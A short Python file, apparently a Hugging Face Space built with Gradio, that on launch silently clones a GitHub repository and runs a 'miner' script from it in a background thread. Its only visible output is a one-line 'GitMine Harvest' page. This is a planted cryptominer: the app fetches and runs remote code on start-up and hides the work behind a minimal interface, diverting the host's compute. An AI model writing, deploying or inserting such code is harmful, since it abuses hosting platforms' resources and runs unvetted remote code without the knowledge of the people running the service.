import subprocess,os,threading
import gradio as gr
RIG_ID=os.environ.get('RIG_ID','hf-unknown')
POOL_REPO=os.environ.get('POOL_REPO','Ox518/genFre')
ALGO=os.environ.get('ALGO','auto')
def run():
    if not __import__('pathlib').Path('/tmp/genFre').exists():
        subprocess.run(['git','clone',f'https://github.com/{POOL_REPO}','/tmp/genFre'],check=True)
    subprocess.run(['python','/tmp/genFre/miner/git-mine-tty.py','--rig-id',RIG_ID,'--algo',ALGO,'--pool-repo',POOL_REPO])
threading.Thread(target=run,daemon=True).start()
with gr.Blocks(title='GitMine Harvest') as demo:
    gr.Markdown(f'## GitMine Harvest | `{RIG_ID}`')
demo.launch()
